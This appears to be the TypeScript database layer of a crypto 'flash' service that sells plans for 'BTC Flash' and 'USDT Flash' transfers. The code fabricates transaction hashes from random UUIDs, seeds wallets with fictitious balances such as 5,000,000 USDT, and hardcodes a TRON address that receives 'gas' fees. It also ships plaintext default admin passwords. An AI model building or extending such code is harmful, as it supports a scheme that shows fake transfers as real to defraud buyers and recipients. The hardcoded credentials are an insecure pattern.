import { 
  users, wallets, transactions, subscriptionPlans, userSubscriptions, marketData, networkConfigs,
  type User, type InsertUser,
  type Wallet, type InsertWallet,
  type Transaction, type InsertTransaction,
  type SubscriptionPlan, type InsertSubscriptionPlan,
  type UserSubscription, type InsertUserSubscription,
  type MarketData, type NetworkConfig
} from "@shared/schema";
import { db } from './db';
import { eq, and } from 'drizzle-orm';
import { randomUUID } from "crypto";

export interface IStorage {
  // User operations
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;

  // Wallet operations
  getWalletsByUserId(userId: string): Promise<Wallet[]>;
  createWallet(wallet: InsertWallet): Promise<Wallet>;

  // Transaction operations
  getTransactionsByUserId(userId: string): Promise<Transaction[]>;
  createTransaction(transaction: InsertTransaction): Promise<Transaction>;
  updateTransaction(id: string, updates: Partial<Transaction>): Promise<Transaction>;

  // Gas receiver address operations
  getGasReceiverAddress(): string | undefined;
  setGasReceiverAddress(address: string): void;

  // Subscription operations
  getSubscriptionPlans(): Promise<SubscriptionPlan[]>;
  createSubscription(subscription: InsertUserSubscription): Promise<UserSubscription>;
  getUserSubscription(userId: string): Promise<UserSubscription | undefined>;
  getUserSubscriptions(userId: string): Promise<UserSubscription[]>;

  // Market data operations
  saveMarketData(data: Omit<MarketData, 'id' | 'timestamp'>): Promise<MarketData>;
  getMarketData(symbol: string, limit?: number): Promise<MarketData[]>;
  getLatestMarketData(symbols: string[]): Promise<MarketData[]>;

  // Network configuration operations
  getNetworkConfigs(): Promise<NetworkConfig[]>;
  updateWalletBalance(walletId: string, balance: string): Promise<void>;
}



export class DatabaseStorage implements IStorage {
  private gasReceiverAddress: string = "TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y";

  constructor() {
    this.initializeDefaultData();
  }

  private async initializeDefaultData() {
    try {
      // Check if default users already exist
      const existingAdmin = await this.getUserByUsername("admin");
      if (existingAdmin) return; // Already initialized

      // Create default users
      const adminUser = await db.insert(users).values({
        username: "admin",
        password: "usdt123",
      }).returning();

      const henryUser = await db.insert(users).values({
        username: "SoftwareHenry", 
        password: "Rmabuw190",
      }).returning();

      // Create subscription plans
      const plans = await db.insert(subscriptionPlans).values([
        {
          name: "Basic",
          price: "550",
          features: ["BTC Flash", "ETH Flash", "Basic Support"],
        },
        {
          name: "Pro", 
          price: "950",
          features: ["All Basic Features", "USDT Flash", "BNB Flash", "Priority Support"],
        },
        {
          name: "Full",
          price: "3000",
          features: ["All Networks", "Premium Support", "Custom Flash Options", "API Access"],
        }
      ]).returning();

      // Initialize network configurations
      await db.insert(networkConfigs).values([
        {
          network: "ETH",
          name: "Ethereum",
          rpcUrl: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
          chainId: "1",
          blockExplorer: "https://etherscan.io",
          nativeCurrency: "ETH"
        },
        {
          network: "BSC",
          name: "BNB Smart Chain", 
          rpcUrl: "https://bsc-dataseed1.binance.org",
          chainId: "56",
          blockExplorer: "https://bscscan.com",
          nativeCurrency: "BNB"
        },
        {
          network: "TRX",
          name: "TRON",
          rpcUrl: "https://api.trongrid.io",
          chainId: "mainnet",
          blockExplorer: "https://tronscan.org",
          nativeCurrency: "TRX"
        },
        {
          network: "BTC",
          name: "Bitcoin",
          rpcUrl: "https://blockstream.info/api",
          chainId: "mainnet", 
          blockExplorer: "https://blockstream.info",
          nativeCurrency: "BTC"
        }
      ]).onConflictDoNothing().returning();

      // Create admin subscriptions
      if (adminUser[0] && henryUser[0] && plans[2]) {
        await db.insert(userSubscriptions).values([
          {
            userId: adminUser[0].id,
            planId: plans[2].id,
            status: "active",
            paymentTxHash: "admin-default",
            expiresAt: new Date(Date.now() + 10 * 365 * 24 * 60 * 60 * 1000), // 10 years
          },
          {
            userId: henryUser[0].id,
            planId: plans[2].id,
            status: "active", 
            paymentTxHash: "admin-default",
            expiresAt: new Date(Date.now() + 10 * 365 * 24 * 60 * 60 * 1000), // 10 years
          }
        ]);

        // Create default wallets for admin
        await db.insert(wallets).values([
          {
            userId: adminUser[0].id,
            name: "Bitcoin Wallet",
            address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            network: "BTC",
            balance: "1.234",
          },
          {
            userId: adminUser[0].id,
            name: "Ethereum Wallet", 
            address: "0x742d35Cc0123456789012345678901234567890a",
            network: "ETH",
            balance: "15.67",
          },
          {
            userId: adminUser[0].id,
            name: "USDT Wallet",
            address: "TQn9Y2khEsLJW1ChVWFMSMeRDow5oNDMnt",
            network: "TRX",
            balance: "5000000.00",
          }
        ]);
      }
    } catch (error) {
      console.error("Error initializing default data:", error);
    }
  }

  async getUser(id: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user || undefined;
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.username, username));
    return user || undefined;
  }

  async createUser(userData: InsertUser): Promise<User> {
    const [user] = await db.insert(users).values(userData).returning();
    return user;
  }

  async getWalletsByUserId(userId: string): Promise<Wallet[]> {
    return await db.select().from(wallets).where(eq(wallets.userId, userId));
  }

  async createWallet(walletData: InsertWallet): Promise<Wallet> {
    const [wallet] = await db.insert(wallets).values(walletData).returning();
    return wallet;
  }

  async getTransactionsByUserId(userId: string): Promise<Transaction[]> {
    return await db.select().from(transactions).where(eq(transactions.userId, userId));
  }

  async createTransaction(transactionData: InsertTransaction): Promise<Transaction> {
    const [transaction] = await db.insert(transactions).values({
      ...transactionData,
      txHash: `0x${randomUUID().replace(/-/g, '')}`,
    }).returning();
    return transaction;
  }

  async updateTransaction(id: string, updates: Partial<Transaction>): Promise<Transaction> {
    const [updated] = await db.update(transactions)
      .set(updates)
      .where(eq(transactions.id, id))
      .returning();
    
    if (!updated) {
      throw new Error("Transaction not found");
    }
    return updated;
  }

  getGasReceiverAddress(): string | undefined {
    return this.gasReceiverAddress;
  }

  setGasReceiverAddress(address: string): void {
    this.gasReceiverAddress = address;
  }

  async getSubscriptionPlans(): Promise<SubscriptionPlan[]> {
    return await db.select().from(subscriptionPlans);
  }

  async getUserSubscriptions(userId: string): Promise<UserSubscription[]> {
    return await db.select().from(userSubscriptions).where(eq(userSubscriptions.userId, userId));
  }

  async createSubscription(subscriptionData: InsertUserSubscription): Promise<UserSubscription> {
    const [subscription] = await db.insert(userSubscriptions).values(subscriptionData).returning();
    return subscription;
  }

  async getUserSubscription(userId: string): Promise<UserSubscription | undefined> {
    const [subscription] = await db.select()
      .from(userSubscriptions)
      .where(and(
        eq(userSubscriptions.userId, userId),
        eq(userSubscriptions.status, 'active')
      ));
    return subscription || undefined;
  }

  // Market data operations
  async saveMarketData(data: Omit<MarketData, 'id' | 'timestamp'>): Promise<MarketData> {
    const [marketDataRecord] = await db.insert(marketData).values(data).returning();
    return marketDataRecord;
  }

  async getMarketData(symbol: string, limit: number = 100): Promise<MarketData[]> {
    return await db.select()
      .from(marketData)
      .where(eq(marketData.symbol, symbol))
      .orderBy(marketData.timestamp)
      .limit(limit);
  }

  async getLatestMarketData(symbols: string[]): Promise<MarketData[]> {
    const results = await Promise.all(
      symbols.map(async (symbol) => {
        const [latest] = await db.select()
          .from(marketData)
          .where(eq(marketData.symbol, symbol))
          .orderBy(marketData.timestamp)
          .limit(1);
        return latest;
      })
    );
    return results.filter(Boolean);
  }

  // Network configuration operations
  async getNetworkConfigs(): Promise<NetworkConfig[]> {
    return await db.select().from(networkConfigs).where(eq(networkConfigs.isActive, true));
  }

  async updateWalletBalance(walletId: string, balance: string): Promise<void> {
    await db.update(wallets)
      .set({ 
        balance, 
        lastSyncAt: new Date() 
      })
      .where(eq(wallets.id, walletId));
  }
}

export const storage = new DatabaseStorage();